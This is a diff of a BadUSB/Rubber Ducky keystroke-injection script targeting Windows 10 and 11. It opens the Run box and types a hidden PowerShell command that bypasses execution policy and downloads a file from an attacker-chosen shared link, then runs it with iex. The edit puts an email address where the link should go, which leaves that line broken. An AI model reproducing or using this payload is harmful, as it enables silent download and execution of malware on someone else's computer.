@@ -9,7 +9,7 @@ REM     Target: Windows 10, 11
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> dl=1; iex $pl
+STRING powershell -w h -NoP -NonI -ep Bypass $pl = iwr lanyi0219@gmail.com dl=1; iex $pl
 ENTER
 
 REM     Remember to replace the link with your DropBox shared link for the intended file to download
